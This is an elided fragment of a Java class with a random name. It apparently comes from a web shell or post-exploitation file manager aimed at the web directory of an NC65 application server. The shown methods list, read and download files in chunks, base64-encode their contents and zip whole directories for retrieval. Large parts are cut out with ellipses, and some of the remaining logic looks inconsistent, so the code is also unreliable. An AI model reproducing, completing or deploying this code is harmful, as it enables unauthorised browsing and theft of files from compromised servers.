...
public class Qfptauppqh {
    ...
    public Qfptauppqh() {
        ...
        mode = mode + "list";
        path = "";
        path = path + "/apps/nc65/nchome/hotwebs/";
    ...
    private String show() throws Exception {
        ...
        return Qfptauppqh.base64encode(fileContent);
    }
    ...
    private String downloadPart(String path, long blockIndex, long blockSize) throws Exception {
        ...
        return Qfptauppqh.base64encode(Arrays.copyOfRange(content, 0, size));
    }
    ...
    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        ...
        try {
            ...
            Qfptauppqh.compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
        ...
        if (sourceFile.isFile()) {
            ...
            if (listFiles == null || listFiles.length == 0) {
                ...
                for (File file : listFiles) {
                    if (KeepDirStructure) {
                        Qfptauppqh.compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                        continue;
                    }
                    Qfptauppqh.compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }
